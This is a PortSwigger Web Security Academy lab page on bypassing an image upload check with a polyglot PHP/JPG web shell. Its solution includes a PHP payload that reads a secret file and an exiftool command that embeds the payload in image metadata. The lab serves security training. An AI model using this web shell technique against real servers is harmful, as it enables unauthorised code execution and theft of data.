# Lab: Remote code execution via polyglot web shell upload

Source: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload
Fetched: 2026-06-28T09:17:49.971204+00:00

Web Security Academy

File upload vulnerabilities

Lab

Lab: Remote code execution via polyglot web shell upload

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

Solution

On your system, create a file called exploit.php containing a script for fetching the contents of Carlos's secret. For example:

<?php echo file_get_contents('/home/carlos/secret'); ?>

Log in and attempt to upload the script as your avatar. Observe that the server successfully blocks you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.

Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:

exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php

This adds your PHP payload to the image's Comment field, then saves the image with a .php extension.

In the browser, upload the polyglot image as your avatar, then go back to your account page.

In Burp's proxy history, find the GET /files/avatars/polyglot.php request. Use the message editor's search feature to find the START string somewhere within the binary image data in the response. Between this and the END string, you should see Carlos's secret, for example:

START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END

Submit the secret to solve the lab.

Community solutions

Intigriti

Find file upload vulnerabilities using Burp Suite

Try for free
